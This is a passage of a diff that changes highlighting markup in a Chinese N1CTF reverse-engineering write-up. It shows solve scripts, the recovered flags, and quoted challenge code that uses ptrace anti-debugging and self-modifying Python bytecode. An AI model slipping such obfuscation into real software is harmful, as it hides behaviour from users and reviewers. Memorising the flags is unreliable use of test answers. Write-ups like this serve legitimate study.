-__<span class="hljs-function">m128i <span class="hljs-title">re_pshufd</span><span class="hljs-params">(__m128i v, UCHAR ord)</span> </span>{
+<span class="hljs-function">__m128i <span class="hljs-title">re_pshufd</span><span class="hljs-params">(__m128i v, UCHAR ord)</span> </span>{
     UCHAR ord_1 = ord &amp; <span class="hljs-number">0b00000011</span>;
     UCHAR ord_2 = (ord &amp; <span class="hljs-number">0b00001111</span>) &gt;&gt; <span class="hljs-number">2</span>;
     UCHAR ord_3 = (ord &amp; <span class="hljs-number">0b00111111</span>) &gt;&gt; <span class="hljs-number">4</span>;
@@ -846,7 +846,7 @@ __<span class="hljs-function">m128i <span class="hljs-title">re_pshufd</span><sp
     }
     <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) {
         <span class="hljs-keyword">if</span> (hits[i] == <span class="hljs-number">0</span>) {
-            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"invaild pshufd ord\n"</span>);
+            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;invaild pshufd ord\n&quot;</span>);
             <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
         }
     }
@@ -856,16 +856,16 @@ __<span class="hljs-function">m128i <span class="hljs-title">re_pshufd</span><sp
     }
     <span class="hljs-keyword">return</span> result;
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_addq</span><span class="hljs-params">(__m128i he, __m128i v2)</span> </span>{
+<span class="hljs-function">__m128i <span class="hljs-title">re_addq</span><span class="hljs-params">(__m128i he, __m128i v2)</span> </span>{
     <span class="hljs-keyword">return</span> _mm_sub_epi64(he, v2);
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_subq</span><span class="hljs-params">(__m128i jieguo, __m128i jianshu)</span> </span>{
+<span class="hljs-function">__m128i <span class="hljs-title">re_subq</span><span class="hljs-params">(__m128i jieguo, __m128i jianshu)</span> </span>{
     <span class="hljs-keyword">return</span> _mm_add_epi64(jieguo, jianshu);
 }
-__<span class="hljs-function">m128i <span class="hljs-title">re_xorq</span><span class="hljs-params">(__m128i v, __m128i v2)</span> </span>{
+<span class="hljs-function">__m128i <span class="hljs-title">re_xorq</span><span class="hljs-params">(__m128i v, __m128i v2)</span> </span>{
     <span class="hljs-keyword">return</span> _mm_xor_si128(v, v2);
 }
-__<span class="hljs-function">m128i <span class="hljs-title">b2m</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* code)</span> </span>{
+<span class="hljs-function">__m128i <span class="hljs-title">b2m</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* code)</span> </span>{
     <span class="hljs-keyword">return</span> *(__m128i*)code;
 }</code></pre><p>把rev_flow.txt里的c代码复制到vs里编译,堆栈设置100mb即可运行
 Flag :
@@ -875,7 +875,7 @@ n1ctf{Easy_AVX!}</p>
 <p>输入一串16进制数</p>
 <p>题目先对输入做了一堆表变换，然后又检查一个线性方程组</p>
 <p>线性方程组是模0x125意义下的，这个模操作被编译器优化成了一些乘法和减法，需要按照算术结构猜一下</p>
-<pre class="hljs"><code><span class="hljs-keyword">from</span> sage.all <span class="hljs-keyword">import</span> *
+<pre class="hljs"><code><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *
 
 F = Zmod(<span class="hljs-number">0x125</span>)
 
@@ -934,12 +934,12 @@ dats = [
 ]
 
 M = Matrix(F, dats)
-y = M[:,<span class="hljs-number">-1</span>]
-M = M[:,:<span class="hljs-number">-1</span>]
+y = M[:,-<span class="hljs-number">1</span>]
+M = M[:,:-<span class="hljs-number">1</span>]
 <span class="hljs-comment">#print(M)</span>
 x = M.solve_right(y)
 <span class="hljs-keyword">assert</span> M*x == y
-print(x.list())</code></pre><p>解出来是 [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]</p>
+<span class="hljs-built_in">print</span>(x.<span class="hljs-built_in">list</span>())</code></pre><p>解出来是 [201, 247, 36, 211, 26, 224, 241, 131, 112, 24, 2, 0, 17, 243, 56, 186]</p>
 <p>然后需要做 func1 的逆变换
 func1 总共对输入数据进行9次变换，每次以4字节为一组做如下查表操作
 input 4 bytes -&gt; ((table3 + table5) + (table4 + table5)) -&gt; output 4 bytes</p>
@@ -951,28 +951,28 @@ input 4 bytes -&gt; ((table3 + table5) + (table4 + table5)) -&gt; output 4 bytes
 <p>枚举 (x0, x1) pair，把 table[x0]^table[x1] 存到哈希表里
 枚举 (x2, x3) pair，用 table[x2]^table[x3]^const 查询哈希表
 就能找到正确的 x0,x1,x2,x3</p>
-<pre class="hljs"><code><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> List
+<pre class="hljs"><code><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>
 <span class="hljs-keyword">from</span> tables <span class="hljs-keyword">import</span> *
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_func2</span><span class="hljs-params">(inp: List[int])</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_func2</span>(<span class="hljs-params">inp: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>):</span>
     table = (<span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">14</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">15</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>)
     out = [<span class="hljs-number">0</span>] * <span class="hljs-number">16</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>):
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):
         out[i] = inp[table[i]]
     <span class="hljs-keyword">return</span> out
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inv_table</span><span class="hljs-params">(tab, val: List[int])</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inv_table</span>(<span class="hljs-params">tab, val: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>):</span>
     val = (val[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>) | (val[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>) | (val[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>) | val[<span class="hljs-number">3</span>]
-    t0 = dict()
-    <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">0</span>]):
-        <span class="hljs-keyword">for</span> j, y <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">1</span>]):
+    t0 = <span class="hljs-built_in">dict</span>()
+    <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tab[<span class="hljs-number">0</span>]):
+        <span class="hljs-keyword">for</span> j, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tab[<span class="hljs-number">1</span>]):
             v = x ^ y
             t0[v] = (i, j)
-    t1 = dict()
-    <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">2</span>]):
-        <span class="hljs-keyword">for</span> j, y <span class="hljs-keyword">in</span> enumerate(tab[<span class="hljs-number">3</span>]):
+    t1 = <span class="hljs-built_in">dict</span>()
+    <span class="hljs-keyword">for</span> i, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tab[<span class="hljs-number">2</span>]):
+        <span class="hljs-keyword">for</span> j, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(tab[<span class="hljs-number">3</span>]):
             v = x ^ y
             t1[v] = (i, j)
     ans = []
@@ -981,24 +981,24 @@ input 4 bytes -&gt; ((table3 + table5) + (table4 + table5)) -&gt; output 4 bytes
         <span class="hljs-keyword">if</span> v1 <span class="hljs-keyword">in</span> t1:
             pos1 = t1[v1]
             ans.append([*pos0, *pos1])
-    <span class="hljs-keyword">assert</span> len(ans) == <span class="hljs-number">1</span>
+    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(ans) == <span class="hljs-number">1</span>
     <span class="hljs-keyword">return</span> ans[<span class="hljs-number">0</span>]
 
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_func1</span><span class="hljs-params">(inp: List[int])</span>:</span>
-    inp = [t1[i].tolist().index(inp[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">16</span>)]
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">re_func1</span>(<span class="hljs-params">inp: <span class="hljs-type">List</span>[<span class="hljs-built_in">int</span>]</span>):</span>
+    inp = [t1[i].tolist().index(inp[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]
     inp = re_func2(inp)
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reversed(range(<span class="hljs-number">9</span>)):
-        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> reversed(range(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span>)):
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)):
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">4</span>)):
             tmp = inv_table(table4[i][j:j+<span class="hljs-number">4</span>], inp[j:j+<span class="hljs-number">4</span>])
             inp[j:j+<span class="hljs-number">4</span>] = inv_table(table3[i][j:j+<span class="hljs-number">4</span>], tmp)
         inp = re_func2(inp)
     <span class="hljs-keyword">return</span> inp
 
 
-<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
     inp = [<span class="hljs-number">201</span>, <span class="hljs-number">247</span>, <span class="hljs-number">36</span>, <span class="hljs-number">211</span>, <span class="hljs-number">26</span>, <span class="hljs-number">224</span>, <span class="hljs-number">241</span>, <span class="hljs-number">131</span>, <span class="hljs-number">112</span>, <span class="hljs-number">24</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">243</span>, <span class="hljs-number">56</span>, <span class="hljs-number">186</span>]
-    print(re_func1(inp))</code></pre><p>解出来是 [188, 148, 96, 177, 114, 49, 199, 227, 116, 190, 88, 116, 39, 204, 63, 26]</p>
+    <span class="hljs-built_in">print</span>(re_func1(inp))</code></pre><p>解出来是 [188, 148, 96, 177, 114, 49, 199, 227, 116, 190, 88, 116, 39, 204, 63, 26]</p>
 <p>转成16进制</p>
 <p>flag:inctf{bc9460b17231c7e374be587427cc3f1a}</p>
 <p class="img-container"><img src="https://i.imgur.com/he2Axzl.png" alt=""></p>
@@ -1007,82 +1007,82 @@ input 4 bytes -&gt; ((table3 + table5) + (table4 + table5)) -&gt; output 4 bytes
 <p>修改代码如下，然后编译</p>
 <pre class="hljs"><code>    (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna say goodbye $($code:tt)*)) =&gt; {
         $Gonna = $Never[$Give];
-        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Gonna = Never[Give: {}]: {}"</span>, $Give, $Never[$Give]);
+        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Gonna = Never[Give: {}]: {}&quot;</span>, $Give, $Never[$Give]);
         check!(@e ($Never,$Gonna,$Give); ($($code)*));
     };
     (@e ($Never:expr,$Gonna:expr,$Give:expr); (Never gonna tell a lie and hurt you $($code:tt)*)) =&gt; {
         $Never[$Give] = $Gonna;
-        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Never[Give: {}] = Gonna: {}"</span>, $Give, $Gonna);
+        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Never[Give: {}] = Gonna: {}&quot;</span>, $Give, $Gonna);
         check!(@e ($Never,$Gonna,$Give); ($($code)*));
     };
-
+    
     <span class="hljs-keyword">let</span> result = check!(@s n1ctf{<span class="hljs-number">00000000000000000000000000000000</span>});</code></pre><p>由于只有加减法，明文与密文每一位之间的差值是固定的</p>
 <pre class="hljs"><code>cipher = [<span class="hljs-number">148</span>, <span class="hljs-number">59</span>, <span class="hljs-number">143</span>, <span class="hljs-number">112</span>, <span class="hljs-number">121</span>, <span class="hljs-number">186</span>, <span class="hljs-number">106</span>, <span class="hljs-number">133</span>, <span class="hljs-number">55</span>, <span class="hljs-number">90</span>, <span class="hljs-number">164</span>, <span class="hljs-number">166</span>, <span class="hljs-number">167</span>, <span class="hljs-number">121</span>, <span class="hljs-number">174</span>, <span class="hljs-number">147</span>, <span class="hljs-number">148</span>,
  <span class="hljs-number">167</span>, <span class="hljs-number">99</span>, <span class="hljs-number">86</span>, <span class="hljs-number">81</span>, <span class="hljs-number">161</span>, <span class="hljs-number">151</span>, <span class="hljs-number">149</span>, <span class="hljs-number">132</span>, <span class="hljs-number">56</span>, <span class="hljs-number">88</span>, <span class="hljs-number">188</span>, <span class="hljs-number">141</span>, <span class="hljs-number">127</span>, <span class="hljs-number">151</span>, <span class="hljs-number">63</span>]
 fake_cipher = [<span class="hljs-number">131</span>, <span class="hljs-number">53</span>, <span class="hljs-number">124</span>, <span class="hljs-number">109</span>, <span class="hljs-number">118</span>, <span class="hljs-number">165</span>, <span class="hljs-number">89</span>, <span class="hljs-number">131</span>, <span class="hljs-number">50</span>, <span class="hljs-number">83</span>, <span class="hljs-number">163</span>, <span class="hljs-number">149</span>, <span class="hljs-number">165</span>, <span class="hljs-number">104</span>, <span class="hljs-number">153</span>, <span class="hljs-number">145</span>, <span class="hljs-number">142</span>, <span class="hljs-number">149</span>, <span class="hljs-number">77</span>, <span class="hljs-number">69</span>, <span class="hljs-number">60</span>, <span class="hljs-number">154</span>, <span class="hljs-number">133</span>, <span class="hljs-number">128</span>, <span class="hljs-number">115</span>, <span class="hljs-number">54</span>, <span class="hljs-number">69</span>, <span class="hljs-number">168</span>, <span class="hljs-number">133</span>, <span class="hljs-number">105</span>, <span class="hljs-number">146</span>, <span class="hljs-number">59</span>]
-<span class="hljs-keyword">for</span> c, f <span class="hljs-keyword">in</span> zip(cipher, fake_cipher):
-    <span class="hljs-keyword">print</span> (chr(c - f + <span class="hljs-number">48</span>), end=<span class="hljs-string">''</span>)
+<span class="hljs-keyword">for</span> c, f <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(cipher, fake_cipher):
+    <span class="hljs-built_in">print</span> (<span class="hljs-built_in">chr</span>(c - f + <span class="hljs-number">48</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)
 <span class="hljs-comment"># A6C33EA2571A2AE26BFAE7BEA2CD8F54</span></code></pre><h3 id="py"><a class="header-link" href="#py"></a>Py</h3>
 <p>首先解elf文件，能在目录下得到两个pyc
 修改文件头，<code>0a5n.py</code> 为</p>
 <pre class="hljs"><code><span class="hljs-keyword">import</span> L
 <span class="hljs-keyword">from</span> var <span class="hljs-keyword">import</span> *
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_format</span><span class="hljs-params">(flag)</span>:</span>
-    <span class="hljs-keyword">if</span> len(flag) != <span class="hljs-number">28</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_format</span>(<span class="hljs-params">flag</span>):</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) != <span class="hljs-number">28</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:
-        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:
-            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
 
 
 v1 = L.c1(v1, v2, v3)
 v6 = L.c2(v1, v4, v5)
-k = input(<span class="hljs-string">'flag:'</span>)
-<span class="hljs-keyword">if</span> check_format(k) == <span class="hljs-keyword">True</span>:
+k = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>)
+<span class="hljs-keyword">if</span> check_format(k) == <span class="hljs-literal">True</span>:
     v2 = L.f3(k)
     v3 = v2 - v6
     <span class="hljs-keyword">if</span> v3.a2 == g1 <span class="hljs-keyword">and</span> v3.a3 == g2:
-        print(<span class="hljs-string">'Congratulations! n1ctf{%s}'</span> + k)</code></pre><p>L.py 中有乱码，还原字节码能得到两个exec</p>
-<pre class="hljs"><code>z = <span class="hljs-string">''</span>.join([chr(i ^ <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z])
-exec(z)</code></pre><p>实际还原出来是 &lt;&lt;运算，柑橘z中的数据猜测实际为^
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Congratulations! n1ctf{%s}&#x27;</span> + k)</code></pre><p>L.py 中有乱码，还原字节码能得到两个exec</p>
+<pre class="hljs"><code>z = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(i ^ <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> z])
+<span class="hljs-built_in">exec</span>(z)</code></pre><p>实际还原出来是 &lt;&lt;运算，柑橘z中的数据猜测实际为^
 是一个smc</p>
 <pre class="hljs"><code>key = <span class="hljs-number">0</span>
-libc = ctypes.CDLL(<span class="hljs-string">"libc.so.6"</span>)
+libc = ctypes.CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)
 _ptrace = libc.ptrace
 key=_ptrace(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)
 _memcpy = libc.memcpy
 key += <span class="hljs-number">1</span>
-address=id(f1.__code__.co_code)+bytes.__basicsize__<span class="hljs-number">-1</span>
-codes=list(f1.__code__.co_code)
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(codes)):codes[i]^=key
-codes=bytearray(codes)
-buff=(ctypes.c_byte*len(codes)).from_buffer(codes)
-_memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(len(codes)))</code></pre><p>手动patch一下pyc文件，uncompyle6反编译后自己修复一下变量名，发现很多函数的逻辑很奇怪，根据刚才异或运算被解释成了左移运算，题目中的vm可能对基础运算符的opcode进行了相互的调换</p>
+address=<span class="hljs-built_in">id</span>(f1.__code__.co_code)+<span class="hljs-built_in">bytes</span>.__basicsize__-<span class="hljs-number">1</span>
+codes=<span class="hljs-built_in">list</span>(f1.__code__.co_code)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(codes)):codes[i]^=key
+codes=<span class="hljs-built_in">bytearray</span>(codes)
+buff=(ctypes.c_byte*<span class="hljs-built_in">len</span>(codes)).from_buffer(codes)
+_memcpy(ctypes.c_char_p(address),ctypes.cast(buff,ctypes.POINTER(ctypes.c_char)),ctypes.c_int(<span class="hljs-built_in">len</span>(codes)))</code></pre><p>手动patch一下pyc文件，uncompyle6反编译后自己修复一下变量名，发现很多函数的逻辑很奇怪，根据刚才异或运算被解释成了左移运算，题目中的vm可能对基础运算符的opcode进行了相互的调换</p>
 <p>通过使用的参数和函数的形式，猜测应该是个ECC算法，对其进行还原</p>
 <p>0a5n.py:</p>
 <pre class="hljs"><code><span class="hljs-keyword">import</span> L
 <span class="hljs-keyword">from</span> var <span class="hljs-keyword">import</span> *
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_format</span><span class="hljs-params">(flag)</span>:</span>
-    <span class="hljs-keyword">if</span> len(flag) != <span class="hljs-number">28</span>:
-        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_format</span>(<span class="hljs-params">flag</span>):</span>
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) != <span class="hljs-number">28</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
     <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:
-        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">'0123456789abcdef'</span>:
-            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span>:
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
 
 v1 = L.c1(v1, v2, v3)
 v6 = L.c2(v1, v4, v5)
-k = input(<span class="hljs-string">'flag:'</span>)
-<span class="hljs-keyword">if</span> check_format(k) == <span class="hljs-keyword">True</span>:
+k = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;flag:&#x27;</span>)
+<span class="hljs-keyword">if</span> check_format(k) == <span class="hljs-literal">True</span>:
     v2 = L.f3(k)
     v3 = v2 * v6
     <span class="hljs-keyword">if</span> v3.a2 == g1 <span class="hljs-keyword">and</span> v3.a3 == g2:
-        print(<span class="hljs-string">'Congratulations! n1ctf{%s}'</span> % k)</code></pre><p>L.py:</p>
-<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inv_mod</span><span class="hljs-params">(b, p)</span>:</span>
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Congratulations! n1ctf{%s}&#x27;</span> % k)</code></pre><p>L.py:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">inv_mod</span>(<span class="hljs-params">b, p</span>):</span>
     <span class="hljs-keyword">if</span> b &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &lt;= b:
         b = b % p
     c, d = b, p
@@ -1098,16 +1098,16 @@ k = input(<span class="hljs-string">'flag:'</span>)
     <span class="hljs-keyword">else</span>:
         <span class="hljs-keyword">return</span> ud + p
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leftmost_bit</span><span class="hljs-params">(x)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leftmost_bit</span>(<span class="hljs-params">x</span>):</span>
     <span class="hljs-keyword">assert</span> x &gt; <span class="hljs-number">0</span>
     result = <span class="hljs-number">1</span>
     <span class="hljs-keyword">while</span> result &lt;= x:
         result = <span class="hljs-number">2</span> * result
     <span class="hljs-keyword">return</span> result // <span class="hljs-number">2</span>
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Curve</span><span class="hljs-params">(object)</span>:</span>  <span class="hljs-comment"># c1</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Curve</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>  <span class="hljs-comment"># c1</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, p, a, b)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, p, a, b</span>):</span>
         var4 = p
         var4 ^= <span class="hljs-number">0x10000000000000000000000000000000000000000L</span>
         self.p = var4
@@ -1120,13 +1120,13 @@ k = input(<span class="hljs-string">'flag:'</span>)
         var6 += <span class="hljs-number">1</span>
         self.b = var6
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span><span class="hljs-params">(self, x, y)</span>:</span>  <span class="hljs-comment"># 判断是否在曲线上</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span>(<span class="hljs-params">self, x, y</span>):</span>  <span class="hljs-comment"># 判断是否在曲线上</span>
         <span class="hljs-keyword">return</span> (y * y) - (x * x * x + self.a * x + self.b) % self.p == <span class="hljs-number">0</span>
 
 
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span><span class="hljs-params">(object)</span>:</span>   <span class="hljs-comment"># c2</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Point</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span>   <span class="hljs-comment"># c2</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, curve: Curve, x, y, order=None)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, curve: Curve, x, y, order=<span class="hljs-literal">None</span></span>):</span>
         self.curve = curve
         self.x = x
         self.y = y
@@ -1136,13 +1136,13 @@ k = input(<span class="hljs-string">'flag:'</span>)
         <span class="hljs-keyword">if</span> order:
             <span class="hljs-keyword">assert</span> self * order == g1
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span><span class="hljs-params">(self, other)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self, other</span>):</span>
         <span class="hljs-keyword">if</span> self.curve == other.curve <span class="hljs-keyword">and</span> self.x == other.x <span class="hljs-keyword">and</span> self.y == other.y:
-            <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
         <span class="hljs-keyword">else</span>:
-            <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span><span class="hljs-params">(self, other)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__add__</span>(<span class="hljs-params">self, other</span>):</span>
         <span class="hljs-keyword">if</span> other == g1:
             <span class="hljs-keyword">return</span> self
         <span class="hljs-keyword">if</span> self == g1:
@@ -1158,7 +1158,7 @@ k = input(<span class="hljs-string">'flag:'</span>)
         y3 = (l * (self.x - x3) - self.y) % p
         <span class="hljs-keyword">return</span> Point(self.curve, x3, y3)
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__mul__</span><span class="hljs-params">(self, other)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__mul__</span>(<span class="hljs-params">self, other</span>):</span>
         e = other
         <span class="hljs-keyword">if</span> self.order:
             e = e + self.order
@@ -1180,10 +1180,10 @@ k = input(<span class="hljs-string">'flag:'</span>)
 
         <span class="hljs-keyword">return</span> result
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__rmul__</span><span class="hljs-params">(self, other)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__rmul__</span>(<span class="hljs-params">self, other</span>):</span>
         <span class="hljs-keyword">return</span> self * other
 
-    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span><span class="hljs-params">(self)</span>:</span>   <span class="hljs-comment"># double函数</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">s1</span>(<span class="hljs-params">self</span>):</span>   <span class="hljs-comment"># double函数</span>
         <span class="hljs-keyword">if</span> self == g1:
             <span class="hljs-keyword">return</span> g1
         p = self.curve.p <span class="hljs-comment"># 曲线的p</span>
@@ -1194,36 +1194,36 @@ k = input(<span class="hljs-string">'flag:'</span>)
         <span class="hljs-keyword">return</span> Point(self.curve, x3, y3)
 
 
-g1 = Point(<span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>, <span class="hljs-keyword">None</span>)   <span class="hljs-comment"># g1是INFINITY</span>
+g1 = Point(<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)   <span class="hljs-comment"># g1是INFINITY</span>
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f3</span><span class="hljs-params">(var0)</span>:</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f3</span>(<span class="hljs-params">var0</span>):</span>
     var1 = <span class="hljs-number">0</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> var0[::<span class="hljs-number">-1</span>]:
